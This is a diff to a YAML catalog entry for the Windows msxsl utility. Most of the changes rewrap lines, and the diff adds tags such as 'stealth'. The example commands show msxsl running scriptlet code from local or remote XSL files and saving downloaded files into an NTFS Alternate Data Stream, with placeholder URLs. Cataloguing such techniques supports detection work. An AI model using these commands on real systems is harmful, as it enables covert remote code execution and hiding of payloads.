@@ -2,7 +2,8 @@
 id: windows-execution-msxsl
 namespace: windows:execution:msxsl
 name: msxsl
-description: 'Command line utility used to perform XSL transformations. Located at: no default.'
+description: 'Command line utility used to perform XSL transformations. Located at:
+  no default.'
 author: Oddvar Moe
 version: 1.0.0
 capabilities:
@@ -46,7 +47,14 @@ resource_profile:
 allowed-tools:
 - msxsl
 parameters: []
-features: []
+features:
+- file-system
+- local
+- network-intensive
+- pipes-stdin
+- pipes-stdout
+- stealth
+- streaming
 execution:
   template: msxsl
   sandbox: execFile
@@ -54,17 +62,24 @@ execution:
   shell: false
 global_vars: {}
 examples:
-- description: Run COM Scriptlet code within the script.xsl file (local). (Local execution of script stored in XSL file.)
+- description: Run COM Scriptlet code within the script.xsl file (local). (Local execution
+    of script stored in XSL file.)
   command: msxsl.exe {PATH:.xml} {PATH:.xsl}
-- description: Run COM Scriptlet code within the script.xsl file (local). (Local execution of script stored in XSL file.)
+- description: Run COM Scriptlet code within the script.xsl file (local). (Local execution
+    of script stored in XSL file.)
   command: msxsl.exe {PATH:.xml} {PATH:.xsl}
-- description: Run COM Scriptlet code within the shellcode.xml(xsl) file (remote). (Local execution of remote script stored in XSL script stored as an XML file.)
+- description: Run COM Scriptlet code within the shellcode.xml(xsl) file (remote).
+    (Local execution of remote script stored in XSL script stored as an XML file.)
   command: msxsl.exe {REMOTEURL:.xml} {REMOTEURL:.xsl}
-- description: Run COM Scriptlet code within the shellcode.xml(xsl) file (remote). (Local execution of remote script stored in XSL script stored as an XML file.)
+- description: Run COM Scriptlet code within the shellcode.xml(xsl) file (remote).
+    (Local execution of remote script stored in XSL script stored as an XML file.)
   command: msxsl.exe {REMOTEURL:.xml} {REMOTEURL:.xml}
-- description: Using remote XML and XSL files, save the transformed XML file to disk. (Download a file from the internet and save it to disk.)
+- description: Using remote XML and XSL files, save the transformed XML file to disk.
+    (Download a file from the internet and save it to disk.)
   command: msxsl.exe {REMOTEURL:.xml} {REMOTEURL:.xsl} -o {PATH}
-- description: Using remote XML and XSL files, save the transformed XML file to an Alternate Data Stream (ADS). (Download a file from the internet and save it to an NTFS Alternate Data Stream.)
+- description: Using remote XML and XSL files, save the transformed XML file to an
+    Alternate Data Stream (ADS). (Download a file from the internet and save it to
+    an NTFS Alternate Data Stream.)
   command: msxsl.exe {REMOTEURL:.xml} {REMOTEURL:.xsl} -o {PATH}:ads-name
 references:
 - label: '877616321747271680'
@@ -96,7 +111,6 @@ install:
   commands:
   - choco install msxsl
 ---
-
 
 # msxsl
 
